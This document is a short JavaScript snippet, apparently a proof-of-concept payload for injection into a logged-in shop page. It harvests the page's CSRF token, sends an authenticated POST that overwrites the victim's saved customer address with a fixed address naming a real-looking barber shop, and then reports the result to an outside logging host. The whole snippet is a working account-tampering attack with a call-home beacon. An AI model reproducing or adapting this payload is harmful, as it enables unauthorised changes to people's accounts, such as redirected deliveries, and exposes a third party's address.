(async () => {
  const getCsrf = () => {
    const m = document.querySelector('meta[name="csrf-token"],meta[name="x-csrf-token"]');
    if (m && m.content) return m.content;
    if (window.__NEXT_DATA__ && window.__NEXT_DATA__.props) {
      const p = window.__NEXT_DATA__.props.pageProps || {};
      if (p.csrfToken) return p.csrfToken;
    }
    if (window.csrfToken) return window.csrfToken;
    return null;
  };

  const token = getCsrf();
  if (!token) return;

  const body = JSON.stringify({
    item: {
      firstName: "poc",
      lastName: "eneri",
      countryCode: "GB",
      address1: "Kings Barbers, 85 Queens Road",
      address2: "",
      city: "Hastings",
      postalCode: "TN34 1RL",
      phone: "",
      addressId: "1790418860027"
    }
  });

  const res = await fetch('/api/customer/address', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'x-csrf-token': token
    },
    body
  }).catch(() => null);

  if (!res) return;

  fetch('https://shiraishi.vercel.app/log?ok=' + res.status)
    .catch(() => {});
})();
